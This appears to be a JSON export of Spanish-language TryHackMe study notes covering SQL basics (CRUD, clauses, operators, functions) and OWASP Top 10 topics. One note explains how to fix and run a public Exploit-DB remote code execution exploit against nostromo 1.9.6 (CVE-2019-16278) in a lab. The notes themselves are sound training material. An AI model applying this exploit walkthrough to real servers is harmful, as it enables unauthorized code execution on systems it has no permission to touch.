    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/1. Windows Fundamentals 1/0. Windows Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals > 1. Windows Fundamentals 1",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/0. Windows Fundamentals 1]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/1. Windows Fundamentals 1/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Operators",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/7-operators/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/7. Operators.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Cuando trabajamos con SQL y lidiamos con comparaciones y l√≥gica, los operadores son nuestra forma de filtrar y manipular la informaci√≥n de forma efectiva.\n\n----------------------\n<h2>Operadores L√≥gicos</h2>\nEstos operadores comprueban la veracidad de una condici√≥n y devuelven un valor booleano `TRUE` o `FALSE`.\n\n<h4>Operador LIKE</h4>\nEs com√∫nmente usado junto a cl√°usulas `WHERE` para filtrar por patrones o columnas espec√≠ficas.\n\n```sql\nmysql> SELECT *\n\tFROM books\n\tWHERE description LIKE \"%guide%\";\n```\n\n<h4>Operador AND</h4>\nUsa varias condiciones sobre una misma query y devuelve `TRUE` si todas son verdaderas y false si alguna no.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE category = \"Offensive Security\" AND name = \"Bug Bounty Bootcamp\"; \n```\n\n<h4>Operador OR</h4>\nCombina m√∫ltiples condiciones y devuelve `TRUE` si al menos una es verdadera.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE name LIKE \"%Android%\" OR name LIKE \"%iOS%\"; \n```\n\n<h4>Operador NOT</h4>\nEste operador invierte el valor de un valor booleano, es decir devuelve `TRUE` si es falso:\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE NOT description LIKE \"%guide%\";\n```\n\n<h4>Operador BETWEEN</h4>\nNos permite seleccionar valores en un rango, por ejemplo:\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE id BETWEEN 2 AND 4;\n```\n\n-----------------------\n<h2>Operadores de Comparaci√≥n</h2>\nLos operadores comparativos se usan para comparar valores y comprobar si cumplen con el criterio especificado.\n\n<h4>Operador Igual Que</h4>\nEl operador `=` compara dos valores y devuelve `TRUE` si son iguales.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE name = \"Designing Secure Software\";\n```\n\n<h4>Operador No Igual Que</h4>\nEl operador `!=` compara expresiones y comprueba si no son iguales y si no lo son devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE category != \"Offensive Security\";\n```\n\n<h4>Operador Menor Que</h4>\nEl operador `<` comprueba si el valor de la izquierda es menor que el de la derecha, y si es as√≠ devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date < \"2020-01-01\";\n```\n\n<h4>Operador Mayor Que</h4>\nHace lo contrario que el menor que, `>` comprueba si el valor de la izquierda es mayor que el de la derecha y si es as√≠ devuelve `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date > \"2020-01-01\";\n```\n\n<h4>Operador Menor o Igual / Mayor o Igual Que</h4>\nLos operadores `<=` y `>=` comprueban lo que los operadores `<` y `>` pero adem√°s le suman el igual, es decir, que si son mayor o menor e igual el valor a la izquierda y a la derecha devuelven `TRUE`.\n\n```sql\nmysql> SELECT *\n    FROM books\n    WHERE published_date <= \"2021-11-15\";\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "La ciberseguridad es un t√≥pico grande que cubre un rango amplio de temas. Cuando trabajamos en securizar una aplicaci√≥n web, trabajamos con SOC o SIEM, configuramos autentificaci√≥n de usuarios, etc. Podemos hacer uso de las bases de datos.\n\n-------------\n<h2>Pre-Requisitos</h2>\nEsta unidad est√° hecha para principiantes por lo que no se necesitan pasos previos.\n\n--------------\n<h2>Objetivos de aprendizaje</h2>\n- Entender  lo que son las bases de datos y sus conceptos clave.\n- Entender los diferentes tipos de bases de datos.\n- Entender qu√© es SQL.\n- Entender y ser capaz de usar Operaciones SQL CRUD. \n- Entender y ser capaz de usar Operaciones SQL de Cl√°usulas.\n- Entender y ser capaz de usar Operaciones SQL.\n- Entender y ser capaz de usar Operadores SQL.\n- Entender y ser capaz de usar Funciones SQL.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQL Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/0-sql-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/0. SQL Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/1. Introduction]]\n[[2. Databases 101]]\n[[3. SQL]]\n[[4. Database and Table Statements]]\n[[5. CRUD Operations]]\n[[6. Clauses]]\n[[7. Operators]]\n[[8. Functions]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/8-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/8. Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Al trabajar con datos, las funciones pueden ayudarnos a manipularlos. Veamos algunas de las m√°s usadas.\n\n------------------\n<h2>Funciones String</h2>\nSon funciones que realizan operaciones en una string, devolviendo un valor asociado con ella.\n\n<h4>Funci√≥n CONCAT()</h4>\nEsta funci√≥n se usa para juntar dos o m√°s strings.\n\n```sql\nmysql> SELECT CONCAT(name, \" is a type of \", category, \" book.\") AS book_info FROM books;\n+------------------------------------------------------------------+\n| book_info                                                         |\n+------------------------------------------------------------------+\n| Android Security Internals is a type of Defensive Security book. |\n| Bug Bounty Bootcamp is a type of Offensive Security book.        |\n| Car Hacker`s Handbook is a type of Offensive Security book.      |\n| Designing Secure Software is a type of Defensive Security book.  |\n| Ethical Hacking is a type of Offensive Security book.            |\n+------------------------------------------------------------------+\n\n5 rows in set (0.00 sec)\n```\n\n<h4>Funci√≥n GROUP_CONCAT()</h4>\nEsta nos ayuda a concatenar informaci√≥n de m√∫ltiples filas en un campo.\n\n```sql\nmysql> SELECT category, GROUP_CONCAT(name SEPARATOR \", \") AS books\n    FROM books\n    GROUP BY category;\n+--------------------+----------------------------------------------------------+\n| category           | books                                                    |\n+--------------------+----------------------------------------------------------+\n| Defensive Security | Android Security Intern, Designing Secure Software       |\n| Offensive Security | Bug Bounty Bootcamp, Car HackerHandbook, Ethical Hacking |\n+--------------------+----------------------------------------------------------+\n\n2 rows in set (0.01 sec)\n```\n\n<h4>Funci√≥n SUBSTRING()</h4>\nEsta devuelve una substring de una string que coincida con los criterios de filtrado.\n\n```sql\nmysql> SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;\n+----------------+\n| published_year |\n+----------------+\n| 2014           |\n| 2021           |\n| 2016           |\n| 2021           |\n| 2021           |\n+----------------+\n\n5 rows in set (0.00 sec)\n```\n\nExtrae del car√°cter 1 al 4 y lo guarda en la columna \"published_year\".\n\n<h4>Funci√≥n LENGTH()</h4>\nDevuelve el n√∫mero de caracteres de una string.\n\n```sql\nmysql> SELECT LENGTH(name) AS name_length FROM books;\n```\n\n---------------------\n<h2>Funciones de Agregaci√≥n</h2>\nEstas funciones agregan los valores de m√∫ltiples filas con un criterio espec√≠fico.\n\n<h4>Funci√≥n COUNT()</h4>\nEsta devuelve el n√∫mero de registros de una expresi√≥n.\n\n```sql\nmysql> SELECT COUNT(*) AS total_books FROM books;\n+-------------+\n| total_books |\n+-------------+\n|           5 |\n+-------------+\n\n1 row in set (0.01 sec)\n```\n\n<h4>Funci√≥n SUM()</h4>\nSuma todos los valores (no NULL) de una determinada columna.\n\n```sql\nmysql> SELECT SUM(price) AS total_price FROM books;\n+-------------+\n| total_price |\n+-------------+\n|      249.95 |\n+-------------+\n\n1 row in set (0.00 sec)\n```\n\n<h4>Funci√≥n MAX()</h4>\nDevuelve el valor m√°ximo de una columna dada.\n\n```sql\nmysql> SELECT MAX(published_date) AS latest_book FROM books;\n+-------------+\n| latest_book |\n+-------------+\n| 2021-12-21  |\n+-------------+\n\n1 row in set (0.00 sec)\n```\n\n<h4>Funci√≥n MIN()</h4>\nDevuelve el menor valor de una columna dada.\n\n```sql\nmysql> SELECT MIN(published_date) AS earliest_book FROM books;\n+---------------+\n| earliest_book |\n+---------------+\n| 2014-10-14    |\n+---------------+\n\n1 row in set (0.00 sec)\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Database and Table Statements",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/4-database-and-table-statements/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/4. Database and Table Statements.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>Hora de Aprender</h2>\nAhora la parte divertida. Hora de aprender SQL y como interactuar con bases de datos. En esta lecci√≥n vamos a empezar por aprender y usar los statements de tablas y bases de datos.\n\n-----------------\n<h2>Statements de Bases de Datos</h2>\n<h4>CREATE DATABASE</h4>\nSi necesitamos una base de datos nueva, el primer paso que deber√≠amos tomar el crearla. Esto s√≥lo puede ser hecho en SQL usando el comando `CREATE DATABASE`. Se usa la siguiente sintaxis:\n\n```SQL\nmysql> CREATE DATABASE database_name;\n```\n\n<h4>SHOW DATABASES</h4>\nAhora que hemos creado una base de datos, podemos verla usando `SHOW DATABASES`. Esto nos devolver√° una lista de todas las bases de datos que tenemos.\n\n```SQL\nmysql> SHOW DATABASES;\n```\n\n<h4>USE DATABASE</h4>\nSi queremos interactuar con la base de datos, primero debemos decirle al DBMS que queremos usar esa base de datos. Si tuvi√©ramos, por ejemplo, una base de datos llamada \"library\", usar√≠amos:\n\n```sql\nmysql> USE library;\n```\n\n<h4>DROP DATABASE</h4>\nUna vez que una base de datos ya no es necesaria, podemos eliminarla con el comando `DROP` con la siguiente sintaxis.\n\n```sql\nmysql> DROP database library;\n```\n\n--------------\n<h2>Statements de Tablas</h2>\nAhora que podemos crear, listar, usar y eliminar bases de datos toca aprender a poblar esas bases de datos con tablas e interactuar con ellas.\n\n<h4>CREATE TABLE</h4>\nSiguiendo la misma l√≥gica que para las bases de datos, para las tablas tambi√©n se usa `CREATE`. Sin embargo la sintaxis es sustancialmente diferente. Para crear una tabla, debemos conocer los datos que vamos a introducir en ella:\n\n```sql\nmysql> CREATE TABLE inventario_libros (\n\tid_libro INT AUTO_INCREMENT PRIMARY KEY,\n\tnombre_libro VARCHAR(255) NOT NULL,\n\tfecha_publicacion DATE\n);\n```\n\n<h4>SHOW TABLES</h4>\nIgual que podemos listar bases de datos, podemos hacerlo con las tablas.\n\n```sql\nmysql> SHOW TABLES;\n```\n\n---------------\n<h2>DESCRIBE</h2>\nSi queremos qu√© tipo de columnas hay en una tabla, podemos describirlas con el comando `DESCRIBE`. Esto mostrar√° la tabla con la composici√≥n de esta:\n\n```sql\nmysql> DESCRIBE inventario_libros;\n```\n\nArrojar√° un output as√≠:\n\n```sql\n+-------------------+--------------+------+-----+---------+----------------+\n| Field             | Type         | Null | Key | Default | Extra          |\n+-------------------+--------------+------+-----+---------+----------------+\n| id_libro          | int          | NO   | PRI | NULL    | auto_increment |\n| nombre_libro      | varchar(255) | NO   |     | NULL    |                |\n| fecha_publicacion | date         | YES  |     | NULL    |                |\n+-------------------+--------------+------+-----+---------+----------------+\n3 rows in set (0.02 sec)\n```\n\n<h4>ALTER</h4>\nUna vez creada la tabla, puede llegar el momento en el que nuestras necesidades cambien y entonces tendremos que alterar la tabla. Esto puede hacerse usando `ALTER`. Imaginemos que ahora queremos tener una columna que tenga el n√∫mero de p√°ginas de cada libro, para ello:\n\n```sql\nmysql> ALTER TABLE inventario_libros\nADD recuento_paginas INT;\n```\n\nSe puede usar tambi√©n para renombrar o eliminar columnas.\n\n<h4>DROP</h4>\nIgual que hacer drop de una base de datos, `DROP` elimina una tabla:\n\n```sql\nmysql> DROP TABLE inventario_libros;\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Databases 101",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/2-databases-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/2. Databases 101.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>Introduciendo las Bases de Datos</h2>\nLas bases de datos son colecciones ordenadas de informaci√≥n estructurada f√°cilmente accesible. Las bases de datos se usan de manera intensiva. Todo el mundo/programas/empresas pueden y deber√≠an usarlas para almacenar cualquier tipo de informaci√≥n.\n\n-----------------------\n<h2>Diferentes Tipos de Bases de Datos</h2>\nTiene sentido que algo tan popularmente utilizado durante tanto tiempo como las bases de datos tuvieran varias manearas de implementarse, y as√≠ es. Por ahora nos centraremos en las bases de datos relacionales (SQL) y no relacionales (NoSQL).\n\n**Bases de Datos Relacionales:** Guardan informaci√≥n estructurada. Por ejemplo la lista de un usuario consistir√≠a de: `nombre, apellido, email, username y contrase√±a`. Esta informaci√≥n es guardada en filas y columnas en una tabla. Entonces pueden hacerse relaciones entre tablas, por ejemplo: `user e historial_pedidos`.\n\n**Bases de Datos No Relacionales:** En vez de guardar informaci√≥n como la de arriba, esta lo hace en un formato no tabular. Aqu√≠ se muestra un ejemplo:\n\n```bash\n {\n    _id: ObjectId(\"4556712cd2b2397ce1b47661\"),\n    name: { first: \"Thomas\", last: \"Anderson\" },\n    date_of_birth: new Date('Sep 2, 1964'),\n    occupation: [ \"The One\"],\n    steps_taken : NumberLong(4738947387743977493)\n}\n```\n\n\nEn t√©rminos de qu√© tipo de base de datos deber√≠as escoger, siempre se reduce al contexto de su creaci√≥n. Si la exactitud se precisa, las relacionales son mejores mientras que las no relacionales son mejores si la informaci√≥n introducida puede variar mucho en formato o tama√±o pero necesita ser recopilada en el mismo sitio.\n\n--------------------\n<h2>Tablas, Filas y Columnas</h2>\nAhora que hemos definido los dos tipos, nos centraremos en bases de datos relacionales. Empezaremos cubriendo las tablas, filas y columnas. \n\nToda la informaci√≥n guardada en una BDR ser√° almacenada en una **tabla**, por ejemplo si fuera una tienda de libros, podr√≠a tener una tabla llamada \"Libros o \"Books\". Para crear esta tabla necesitar√≠as definir qu√© tipo de informaci√≥n es relevante almacenar, por ejemplo: `id, name, published_date`. Estas ser√≠an nuestras **columnas**. Al definir las columnas tambi√©n tenemos que definir qu√© tipo de datos van dentro. Los tipos pueden ser varios dependiendo de qu√© datos vayamos a guardar: `INT` para enteros, `DATE` para fechas, `FLOAT` para decimales, etc. Una vez creada podemos empezar a a√±adir entradas con datos como `name: \"Android Security Internals\", id: \"1\", published_date: \"2014-10-14\"`. Esto forma una **fila**.\n\n---------------------\n<h2>Claves Primarias y For√°neas</h2>\nPuede que queramos relacionar una tabla que contiene los libros con otra tabla que contiene los autores. En este caso podr√≠amos establecer una relaci√≥n entre las tablas.\n\nEn nuestra tabla de libros, el `id` ser√≠a nuestra clave primaria, porque es √∫nica e irrepetible. As√≠ mismo, en la tabla de autores el `id` podr√≠a ser nuestra PK (Primary Key). Y para relacionarlas a√±adir√≠amos una FK (Foreign Key o Clave For√°nea) en la tabla de libros con el nombre de columna `id_autor`, donde introducir√≠amos el id del autor de la tabla autor.\n\n![[Pasted image 20250930233218.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. SQL",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/3-sql/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/3. SQL.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "<h2>¬øQu√© es SQL?</h2>\nLas bases de datos normalmente se gestionan con un Sistema Gestor de Bases de Datos (DBMS). Sirviendo como una interfaz entre el usuario y la base de datos y sirve para hacer consultas, actualizaciones  y gestiones. Algunos ejemplos son MySQL, MongoDB, Oracle Database y MariaDB.\n\nLa interacci√≥n entre el usuario final y la base de datos puede ser hecha usando SQL (Structured Query Language).\n\n--------------------\n<h2>Los beneficios de SQL y las Bases de Datos Relacionales</h2>\nEstos son algunos de los beneficios  de usar SQL:\n\n- **R√°pido:** Las bases de datos relacionales pueden devolver trozos masivos de informaci√≥n gracias a lo poco que ocupan y la alta velocidad de procesado.\n- **F√°cil de Aprender:** Al contrario que muchos lenguajes de programaci√≥n, SQL est√° escrito en ingl√©s simple. Gracias a esto, los usuarios pueden concentrarse en aprender sus funciones y sintaxis.\n- **Confiable:** Las bases de datos pueden garantizar cierto nivel de precisi√≥n cuando hablamos del tipo de informaci√≥n ya que tiene que cumplir ciertos requisitos para ser introducidos.\n- **Flexible:** SQL ofrece todo tipo de capabilidades cuando a mandar queries a la base de datos se refiere.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. CRUD Operations",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/5-crud-operations/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/5. CRUD Operations.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "**CRUD** significa **C**reate, **R**ead, **U**pdate y **D**elete, que son consideradas las operaciones b√°sicas en cualquier sistema que maneja datos.\n\n----------------------\n<h2>Operaci√≥n Crear (INSERT)</h2>\nNos permite introducir nuevos datos en una tabla. En MySQL, lo podemos hacer con `INSERT INTO`:\n\n```sql\nmysql> INSERT INTO books )id, name, published_date, description)\n\tVALUES (1, \"Android Security Internals\", \"2014-10-14\", \"An In-Depth Guide to Android's Security Architecture\");\n\nQUERY OK, 1 row affected (0.01 sec)\n\n```\n\n------------------------\n<h2>Operaci√≥n Leer (SELECT)</h2>\nLa operaci√≥n `SELECT` nos sirve para obtener datos de la tabla y verlos. Para ver todo el contenido de una tabla, por ejemplo, har√≠amos:\n\n```sql\nmysql> SELECT * FROM books;\n+----+----------------------------+----------------+----------------------------+\n| id | name                       | published_date | description                |\n+----+----------------------------+----------------+----------------------------+\n|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to And...|\n+----+----------------------------+----------------+----------------------------+\n\n1 row in set (0.00 sec)\n```\n\nSi queremos ver una columna en espec√≠fico, debemos especificarlas, por ejemplo:\n\n```sql\nmysql> SELECT name, description FROM books;\n+----------------------------+--------------------------------------------------+\n| name                       | description                                      |\n+----------------------------+--------------------------------------------------+\n| Android Security Internals | An In-Depth Guide Androids Security Architecture |\n+----------------------------+--------------------------------------------------+\n\n1 row in set (0.00 sec)   \n```\n\n----------------------------\n<h2>Operaci√≥n Actualizar (UPDATE)</h2>\nLa operaci√≥n `UPDATE` sirve para modificar una entrada existente y se usa de la siguiente manera:\n\n```sql\nmysql> UPDATE books\n\tSET description = \"An In-Depth Guide to Android's Security Architecture.\"\n\tWHERE id = 1;\n\nQuery OK, 1 row affected (0.00 sec)\nRows matched: 1 Changed: 1 Warnings: 0\n```\n\nUsamos `SET` para especificar el cambio. La cl√°usula `WHERE` especifica la columna que coincida con el criterio de b√∫squeda (busca la columnas DONDE la condici√≥n se cumpla).\n\n---------------------\n<h2>Operaci√≥n Borrar (DELETE)</h2>\nLa operaci√≥n de borrado elimina las entradas de una tabla. Para ello usamos `DELETE`.\n\n```sql\nmysql> DELETE FROM books WHERE id = 1;\n\nQuery OK, 1 row affected (0.00 sec)\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Clauses",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/6-clauses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/3. SQL Fundamentals/6. Clauses.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 3. SQL Fundamentals",
    "content": "Una cl√°usula es una parte de un comando que especifica el criterio de la informaci√≥n manipulada. Estas pueden ayudarnos a definir el tipo de dato y c√≥mo deber√≠a de rescatarse o buscarse.\n\nYa hemos usado algunas, como `FROM` o `WHERE`. Esta lecci√≥n se concentrar√° en las cl√°usulas: `DISTINCT`, `GROUP BY`, `ORDER BY` y `HAVING`.\n\n-----------------\n<h2>Cl√°usula DISTINCT</h2>\nLa cl√°usula `DISTINCT` se usa para evitar duplicados registros al hacer una query, devolviendo s√≥lo valores √∫nicos. La sintaxis es:\n\n```sql\nmysq> SELECT DISTINCT name FROM books;\n```\n\n------------------\n<h2>Cl√°usula GROUP BY</h2>\nSe usa para juntar informaci√≥n de m√∫ltiples registros y agrupa los resultados de la query en columnas. La sintaxis es:\n\n```sql\nmysql> SELECT name, COUNT(*)\n\tFROM books\n\tGROUP BY name;\n\n+----------------------------+----------+\n| name                       | COUNT(*) |\n+----------------------------+----------+\n| Android Security Internals |        1 |\n| Bug Bounty Bootcamp        |        1 |\n| Car Hacker`s Handbook      |        1 |\n| Designing Secure Software  |        1 |\n| Ethical Hacking            |        2 |\n+----------------------------+----------+\n\n5 rows in set (0.00 sec)\n```\n\n--------------------\n<h2>Cl√°usula ORDER BY</h2>\nSe usa para filtrar los registros devueltos por una query en orden ascendente o descendente usando funciones como `ASC` o `DESC`. La sintaxis es:\n\n```sql\nmysql> SELECT *\n\tFROM books\n\tORDER BY published_date ASC;\n```\n\n-----------------\n<h2>Cl√°usula HAVING</h2>\nLa cl√°usula `HAVING` es usada junto con otras cl√°usulas para filtrar grupos o resultados de registros basado en una condici√≥n, por ejemplo:\n\n```sql\nmysql> SELECT name, COUNT(*)\n\tFROM books\n\tGROUP BY name\n\tHAVING name LIKE '%Hack%';\n\t\n+-----------------------+----------+\n| name                  | COUNT(*) |\n+-----------------------+----------+\n| Car Hacker`s Handbook |        1 |\n| Ethical Hacking       |        2 |\n+-----------------------+----------+\n\n2 rows in set (0.00 sec)\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "13. VI. Vulnerable and Outdated Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/13-vi-vulnerable-and-outdated-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/13. VI. Vulnerable and Outdated Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "De forma ocasional, podemos encontrar que la compa√±√≠a o entidad que estamos auditando usa un software que tiene una vulnerabilidad bien conocida.\n\nPor ejemplo, digamos que una compa√±√≠a no ha actualizado su versi√≥n de WordPress desde hace a√±os, y usando una herramienta como [WPScan](https://wpscan.com/), encontramos que es la versi√≥n 4.6. Una b√∫squeda r√°pida revelar√° que esta versi√≥n es vulnerable a ejecuci√≥n remota de comandos sin autentificaci√≥n (RCE) y puedes encontrar un exploit ya hecho en [Exploit-DB](https://www.exploit-db.com/exploits/41962).\n\nComo puedes imaginar, esto ser√≠a devastador porque requiere muy poco trabajo del lado del atacante. La situaci√≥n se agrava cuando te das cuenta de lo relativamente com√∫n que es esto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "14. Vulnerable and Outdated Components - Exploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/14-vulnerable-and-outdated-components-exploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/14. Vulnerable and Outdated Components - Exploit.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Ya que esto va de vulnerabilidades conocidas, la mayor√≠a del trabajo ya ha sido hecho. Nuestro principal objetivo es averiguar la informaci√≥n del software y buscar hasta encontrar un exploit. Veamos un ejemplo.\n\n![[Pasted image 20251011132703.png]]\n\nAqu√≠ vemos la p√°gina por defecto de un servidor que corre Nostromo 1.9.6. Ahora que tenemos el nombre del software y la versi√≥n podemos usar Exploit-DB para buscar exploits para √©l. Por suerte para nosotros, s√≠ que hay:\n\n![[Pasted image 20251011133205.png]]\n\nAl intentar ejecutar el c√≥digo del exploit salta un problema, por eso conviene conocer lenguajes de programaci√≥n, para poder arreglar peque√±os bugs:\n\n```sh\nuser@linux$ python 47837.py\nTraceback (most recent call last):\n  File \"47837.py\", line 10, in <module>\n    cve2019_16278.py\nNameError: name 'cve2019_16278' is not defined\n```\n\nEn nuestro caso, hay que comentar una l√≠nea:\n\n```python\n# Exploit Title: nostromo 1.9.6 - Remote Code Execution\n# Date: 2019-12-31\n# Exploit Author: Kr0ff\n# Vendor Homepage:\n# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz\n# Version: 1.9.6\n# Tested on: Debian\n# CVE : CVE-2019-16278\n\ncve2019_16278.py  # This line needs to be commented.\n\n#!/usr/bin/env python\n```\n\nPor √∫ltimo, volvemos a probar y boom, RCE conseguida!",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "16. VII. Identification and Authentification Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/16-vii-identification-and-authentification-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/16. VII. Identification and Authentification Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La autentificaci√≥n y manejo de sesiones constituye los componentes core de las aplicaciones web modernas. La autentificaci√≥n permite a los usuarios ganar acceso a la apps verificando su identidad. La forma m√°s com√∫n es usando un usuario y contrase√±a. El usuario las provee y el servidor verifica. Si es correcto, le da entonces al usuario una cookie de sesi√≥n. Tener una cookie de sesi√≥n hace que el servidor sepa qui√©n est√° emitiendo las peticiones, por lo que es imprescindible.\n\nSi un atacante consigue encontrar fallos en el mecanismo de autentificaci√≥n, puede ganar acceso a cuentas fuera de su dominio. Algunos de estos fallos incluyen:\n\n- **Ataques de fuerza bruta:** Si una aplicaci√≥n web usa nombres de usuario y contrase√±as, un atacante puede tratar de lanzar un ataque de fuerza bruta que le permita adivinar tanto uno como otro.\n- **Uso de credenciales d√©biles:** Las aplicaciones web deber√≠an de tener pol√≠ticas fuertes de configuraci√≥n de contrase√±as. Si se permite que la contrase√±a sea, por ejemplo, \"password1\" es mucho m√°s f√°cil para un atacante adivinarla.\n- **Cookies de sesi√≥n d√©biles:** Las cookies de sesi√≥n son la manera que el servidor tiene de saber qui√©n es alguien. Si esa cookie contiene valores predecibles los atacantes pueden configurar sus propias cookies y acceder a cuentas de usuarios.\n\nPuede haber varias formas de mitigaci√≥n para mecanismos de autentificaci√≥n rotos dependiendo del contexto:\n\n- Para evitar los ataques de adivinar contrase√±as, aseg√∫rate de que la aplicaci√≥n requiere una contrase√±a fuerte.\n- Para evitar los ataques de fuerza bruta, aseg√∫rate de que la aplicaci√≥n fuerce un bloqueo despu√©s de cierto n√∫mero de intentos fallidos.\n- Implementa factor de doble autentificaci√≥n. Si un usuario tiene m√∫ltiples m√©todos de autentificaci√≥n, como por ejemplo usuario y contrase√±a y un c√≥digo en su m√≥vil, es m√°s dif√≠cil para el atacante ganar acceso.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
